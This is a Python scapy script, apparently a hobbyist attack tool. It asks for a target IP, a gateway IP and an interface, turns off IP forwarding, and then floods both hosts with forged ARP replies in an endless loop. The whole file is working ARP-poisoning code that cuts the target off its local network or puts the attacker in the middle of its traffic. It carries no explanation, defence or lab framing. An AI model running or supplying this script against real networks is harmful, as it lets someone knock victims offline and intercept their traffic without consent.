from scapy.all import *
import os
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
os.system("echo '0' > /proc/sys/net/ipv4/ip_forward")
target_ip = str(input(bcolors.OKBLUE + "[+]" + bcolors.ENDC + bcolors.BOLD + " ENTER TARGET IP : " + bcolors.ENDC))
getaway_ip = str(input(bcolors.OKBLUE + "[+]" + bcolors.ENDC + bcolors.BOLD + " ENTER GETAWAY IP : " + bcolors.ENDC))
interface = str(input(bcolors.OKBLUE + "[+]" + bcolors.ENDC + bcolors.BOLD + " ENTER YOUR NETWORK INTERFACE : " + bcolors.ENDC))
print("\n")
print(bcolors.OKBLUE + "[*]" + bcolors.ENDC,bcolors.WARNING + "Triying to get the getaway mac address ..." + bcolors.ENDC)
def get_t_mac():
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip),timeout=2, iface = interface,inter=0.1,verbose=0)
	try :
		target_m = ans[0][1].hwsrc
		return target_m
	except :
		print(bcolors.FAIL + "[---] SEEMS THAT THE TARGET IS DOWN ALREADY OR YOU ENTER THE WRONG IP" + bcolors.ENDC)
		exit()
target_mac = get_t_mac()
def get_g_mac():
	ans1, unans1 = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst=getaway_ip),timeout=2, iface = interface,inter=0.1,verbose=0)
	try :
		getaway_m = ans1[0][1].hwsrc
		return getaway_m
	except :
		print(bcolors.FAIL +"[---] ARE YOU SURE THAT YOU ENTERED THE RIGHT GETEWAY IP" + bcolors.ENDC)
		exit()
getaway_mac = get_g_mac()

print(bcolors.OKGREEN + "[+++]" + bcolors.ENDC + bcolors.BOLD + "GOT BOTH OF THE TARGET MAC ADSRESS AND THE GETEWAY IP :" + bcolors.ENDC)
print("")
print(bcolors.BOLD + "            target mac address : " + str(target_mac) + bcolors.ENDC)
print(bcolors.BOLD + "            getaway mac address : " + str(getaway_mac) +bcolors.ENDC)
print("")
print(bcolors.FAIL + "[+] ATTACKING ATT HARD MODE ..." + bcolors.ENDC)
while 1 :
	send(ARP(op = 2,pdst=target_ip,psrc=getaway_ip,hwdst = target_mac),verbose=0)
	send(ARP(op = 2,pdst=getaway_ip,psrc=target_ip,hwdst = getaway_mac),verbose=0)